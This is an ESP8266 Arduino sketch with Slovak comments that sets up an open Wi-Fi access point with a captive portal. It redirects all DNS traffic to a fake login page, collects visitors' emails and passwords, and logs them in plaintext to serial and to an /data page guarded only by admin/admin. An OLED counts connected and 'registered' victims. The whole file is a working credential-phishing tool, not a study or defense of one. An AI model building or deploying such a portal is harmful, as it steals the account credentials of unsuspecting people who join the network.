#include <ESP8266WiFi.h>
#include <DNSServer.h>
#include <ESP8266WebServer.h>
#include "webpage.h"            // Obsah HTML stránok (index_html, success_html)

#include <Wire.h>
#include <Adafruit_GFX.h>
#include <Adafruit_SSD1306.h>

// OLED displej definície
#define SCREEN_WIDTH 128
#define SCREEN_HEIGHT 64
#define OLED_RESET -1           // Reset pin nie je použitý
Adafruit_SSD1306 display(SCREEN_WIDTH, SCREEN_HEIGHT, &Wire, OLED_RESET);

const byte DNS_PORT = 53;       // DNS port na presmerovanie všetkých požiadaviek
const char* ssid = "MyWiFi";  // Názov WiFi access pointu
const char* password = "";      // Žiadne heslo (otvorený AP)
const IPAddress apIP(192,168,4,1);  // Statická IP adresa AP

DNSServer dnsServer;            // DNS server objekt pre captive portal
ESP8266WebServer webServer(80); // HTTP server na port 80

// Premenné na uloženie prihlasovacích údajov z webu
String savedEmail = "";
String savedPassword = "";

// Štatistiky
int totalClientsTried = 0;      // Počet klientov, ktorí sa pokúsili pripojiť
int totalRegistered = 0;        // Počet úspešne registrovaných klientov

// Piny LED
const int blueLED = D7;         // Modrá LED - bliká stále (indikácia bežiaceho AP)
const int greenLED = D2;        // Zelená LED - bliká po úspešnej registrácii
const int redLED = D1;          // Červená LED - bliká pri chybe

// Časovanie pre bliknutie LED
unsigned long previousBlueMillis = 0;
unsigned long previousGreenMillis = 0;
unsigned long previousRedMillis = 0;
const long interval = 500;      // Interval bliknutia v ms

// Stav LED
bool blueLEDState = LOW;
bool greenLEDState = LOW;
bool redLEDState = LOW;

// Stav registrácie a chýb
bool registrationInProgress = false;
bool errorOccurred = false;      // Ak nastane chyba, bliká červená LED
bool greenBlinkActive = false;   // Po úspešnej registrácii bliká zelená LED stále

// Na sledovanie počtu pripojených klientov
unsigned long lastCheckTime = 0;
unsigned long checkInterval = 10000;  // Kontrola každých 10 sekúnd
int lastClientCount = 0;

void setup() {
  Serial.begin(115200);           // Inicializácia sériovej komunikácie pre debug výpisy

  // Nastavenie LED pinov ako výstup
  pinMode(blueLED, OUTPUT);
  pinMode(greenLED, OUTPUT);
  pinMode(redLED, OUTPUT);

  // Inicializácia OLED displeja cez I2C (SDA = D6, SCL = D5)
  Wire.begin(D6, D5);
  if (!display.begin(SSD1306_SWITCHCAPVCC, 0x3C)) {
    Serial.println(F("SSD1306 initialization failed"));
    while (true);                 // Zastaví sa tu ak OLED nefunguje
  }

  // OLED displej nastavenie
  display.clearDisplay();
  display.setTextSize(1);
  display.setTextColor(SSD1306_WHITE);

  // Nastavenie ESP ako WiFi access point
  WiFi.mode(WIFI_AP);
  WiFi.softAPConfig(apIP, apIP, IPAddress(255, 255, 255, 0));  // Statická IP + gateway + maska
  WiFi.softAP(ssid, password);                                // Spustenie AP bez hesla
  delay(100);                                                 // Malá pauza na spustenie AP

  // Spustenie DNS servera na presmerovanie všetkých DNS požiadaviek na AP IP (Captive portal)
  dnsServer.start(DNS_PORT, "*", apIP);

  // HTTP server - hlavná stránka
  webServer.on("/", HTTP_GET, []() {
    webServer.send(200, "text/html", index_html);
  });

  // HTTP server - spracovanie prihlasovacích údajov cez POST
  webServer.on("/login", HTTP_POST, []() {
    registrationInProgress = true;          // Označíme, že práve spracovávame registráciu
    savedEmail = webServer.arg("email");   // Uložíme email z formulára
    savedPassword = webServer.arg("password"); // Uložíme heslo z formulára

    Serial.println("Received login data:");
    Serial.print("Email: ");
    Serial.println(savedEmail);
    Serial.print("Password: ");
    Serial.println(savedPassword);

    // Kontrola, či boli údaje vyplnené
    if (savedEmail.length() == 0 || savedPassword.length() == 0) {
      errorOccurred = true;                // Nastavíme chybu (bliká červená LED)
      registrationInProgress = false;
      // Odošleme chybu klientovi (bez detailov)
      webServer.send(400, "text/html", "<h1>Chyba: Nezadane udaje!</h1><a href='/'>Späť</a>");
      return;
    }

    totalRegistered++;                    // Zvýšime počet úspešných registrácií
    registrationInProgress = false;

    greenBlinkActive = true;              // Zelená LED začne trvalo blikať
    errorOccurred = false;                 // Reset chyby ak bola predtým

    webServer.send(200, "text/html", success_html);  // Poslanie úspešnej stránky
  });

  // HTTP server - stránka so zobrazením uložených údajov (chránená heslom)
  webServer.on("/data", HTTP_GET, []() {
    if (!webServer.authenticate("admin", "admin")) {
      return webServer.requestAuthentication();
    }

    String response = "<!DOCTYPE html><html><head><meta charset='UTF-8'><title>Login Data</title>";
    response += "<style>body{font-family:Arial;padding:20px;}h1{color:#333;}p{margin:5px 0;}</style></head><body>";
    response += "<h1>Saved Login Data</h1>";
    response += "<p><b>Email:</b> " + savedEmail + "</p>";
    response += "<p><b>Password:</b> " + savedPassword + "</p>";
    response += "<hr>";
    response += "<p><b>Total clients tried:</b> " + String(totalClientsTried) + "</p>";
    response += "<p><b>Total registered:</b> " + String(totalRegistered) + "</p>";
    response += "</body></html>";

    webServer.send(200, "text/html", response);
  });

  // Akákoľvek neznáma URL - vždy posiela hlavnú stránku (index_html)
  webServer.onNotFound([]() {
    webServer.send(200, "text/html", index_html);
  });

  webServer.begin();                   // Spustenie HTTP servera
  Serial.println("Captive portal running...");
}

void loop() {
  dnsServer.processNextRequest();     // Spracovanie DNS požiadaviek (Captive portal)
  webServer.handleClient();            // Spracovanie HTTP požiadaviek

  unsigned long currentMillis = millis();

  // Modrá LED bliká stále (indikácia bežiaceho AP)
  if (currentMillis - previousBlueMillis >= interval) {
    previousBlueMillis = currentMillis;
    blueLEDState = !blueLEDState;
    digitalWrite(blueLED, blueLEDState);
  }

  // Zelená LED bliká stále po úspešnej registrácii
  if (greenBlinkActive) {
    if (currentMillis - previousGreenMillis >= interval) {
      previousGreenMillis = currentMillis;
      greenLEDState = !greenLEDState;
      digitalWrite(greenLED, greenLEDState);
    }
  } else {
    digitalWrite(greenLED, LOW);       // Ak zelená nemá blikať, zhasni ju
  }

  // Červená LED bliká pri chybe
  if (errorOccurred) {
    if (currentMillis - previousRedMillis >= interval) {
      previousRedMillis = currentMillis;
      redLEDState = !redLEDState;
      digitalWrite(redLED, redLEDState);
    }
  } else {
    digitalWrite(redLED, LOW);         // Ak chyba nie je, zhasni červenú LED
  }

  // Každých 10 sekúnd kontroluj počet pripojených klientov
  if (currentMillis - lastCheckTime >= checkInterval) {
    lastCheckTime = currentMillis;
    int currentClients = WiFi.softAPgetStationNum();

    // Ak počet klientov vzrástol, pridaj do celkového počtu pokusov o pripojenie
    if (currentClients > lastClientCount) {
      totalClientsTried += currentClients - lastClientCount;
    }
    lastClientCount = currentClients;
  }

  // OLED displej - zobrazenie základných informácií
  display.clearDisplay();
  display.setCursor(0, 0);
  display.println("Active portal");
  display.print("IP: ");
  display.println(apIP);
  display.println();
  display.print("Clients on AP: ");
  display.println(WiFi.softAPgetStationNum());
  display.print("Tried total: ");
  display.println(totalClientsTried);
  display.print("Registered: ");
  display.println(totalRegistered);
  display.println();

  // V kóde je odstránené zobrazovanie textu chyby na OLED, iba červená LED signalizuje error

  display.display();                 // Aktualizuj OLED displej
}
